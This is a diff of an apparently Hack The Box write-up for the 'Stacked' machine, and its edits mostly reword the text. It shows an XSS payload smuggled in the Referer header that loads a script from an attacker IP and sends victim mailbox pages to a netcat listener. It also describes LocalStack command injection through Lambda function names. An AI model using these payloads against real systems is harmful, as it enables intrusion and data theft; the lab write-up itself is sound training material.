@@ -1,6 +1,6 @@
 ## `http://portfolio.stacked.htb`
 
-This site describes STACKED.HTB's, a software development organization, project portfolio. Much of their projects involve using [LocalStack](https://localstack.cloud/) Docker containers to mock a local AWS environment.
+This site describes the project portfolio of STACKED.HTB, a software development organization. Much of their projects involve using [LocalStack](https://localstack.cloud/) Docker containers to mock a local AWS environment.
 
 ### Content Discovery
 
@@ -123,7 +123,7 @@ Content-Type: text/json; charset=utf8
 
 The data on this form is presumably rendered in whoever looks through the submission's browser. Thus, it may be vulnerable to XSS.
 
-The backend is filtering XSS attempts on the form data effectively. However, it doesn't appear to be applying that filter to the request headers. The `Referer` header must also be rendered to the user, as injecting it with an XSS payload works.
+The backend is filtering XSS attempts on the form data effectively. However, it doesn't appear to be applying that filter to the request headers. The `Referer` header must also be rendered to the user, as injecting it with an XSS payload that contains a link to an attacker-controlled web server seems to trigger a request.
 
 ```http
 POST /process.php HTTP/1.1
@@ -189,9 +189,9 @@ Referer: http://mail.stacked.htb/read-mail.php?id=2
 Connection: keep-alive
 ```
 
-### CSRF Enumeration on `http://mail.stacked.htb`
+### Enumeration of `http://mail.stacked.htb`
 
-Leverage the XSS opportunity to have the user retrieve the home page of `http://mail.stacked.htb` and send it to an attacker-controlled endpoint. This will only work if `http://mail.stacked.htb` has an insecure CORS configuration.
+Leverage the XSS opportunity to have the user retrieve the home page of `http://mail.stacked.htb` and send it to an attacker-controlled endpoint. This will only work if `http://mail.stacked.htb` has an insecure CORS configuration (is this true though since the initial script is initially ran on the `http://mail.stacked.htb` origin?)
 
 Serve `tgihf.js`:
 
@@ -234,15 +234,13 @@ Referer: <script src="http://10.10.14.61/tgihf.js"></script>
 fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
 ```
 
-It appears `http://mail.stacked.htb` does have a CORS misconfiguration after all, because the attack works perfectly.
-
 ```bash
 $ nc -nlvp 8000 > index.html
 listening on [any] 8000 ...
 connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 56160
 ```
 
-The HTML source of `http://mail.stacked.htb` indicates it is the index page of an [AdminLTE](https://github.com/ColorlibHQ/AdminLTE) instance belonging to Adam Perkins. Adam's mailbox shows two email messages, one from Jeremy Taint (subject: "S3 Instance Started") and one from the attacker.
+The HTML source of `http://mail.stacked.htb` indicates it is the index page of an [AdminLTE 3](https://github.com/ColorlibHQ/AdminLTE) instance belonging to Adam Perkins. Adam's mailbox shows two email messages, one from Jeremy Taint (subject: "S3 Instance Started") and one from the attacker.
 
 Jeremy's message is readable at `http://mail.stacked.htb/read-mail.php?id=1`. Modify and rerun the above exploit to retrieve this URL.
 
@@ -267,9 +265,9 @@ $ aws --endpoint-url=http://s3-testing.stacked.htb lambda list-functions
 }
 ```
 
-One of the [critical vulnerabilities](https://blog.sonarsource.com/hack-the-stack-with-localstack) in LocalStack 12.0.6 is in the way its dashboard retrieves the configured Lambda functions. When the dashboard is retrieved, the `POST /lambda/$FUNCTION_NAME/code` LocalStack endpoint is queried. Soon thereafter, `$FUNCTION_NAME` is passed to a shell command unsanitized. Thus, by configuring a Lambda function with an injected shell command and causing the user to browse to the LocalStack dashboard (`http://localhost:8080`, according to the `docker-compose.yml` file), the injected shell command will be executed.
+One of the [critical vulnerabilities](https://blog.sonarsource.com/hack-the-stack-with-localstack) in LocalStack 12.0.6 is in the way its dashboard retrieves the configured Lambda functions. When the dashboard is retrieved, the `POST /lambda/$FUNCTION_NAME/code` LocalStack endpoint is queried. Soon thereafter, `$FUNCTION_NAME` is passed to a shell command unsanitized. Thus, by configuring a Lambda function with an injected shell command as its name and causing the user to browse to the LocalStack dashboard (`http://localhost:8080`, according to the `docker-compose.yml` file), the injected shell command will be executed.
 
-Start by creating an execution policy for the Lambda function to run under.
+Start by creating a generic execution policy for the Lambda function to run under.
 
 ```bash
 $ aws --endpoint-url=http://s3-testing.stacked.htb iam create-role --role-name lambda-ex --assume-role-policy-document '{"Version": "2012-10-17","Statement": [{ "Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
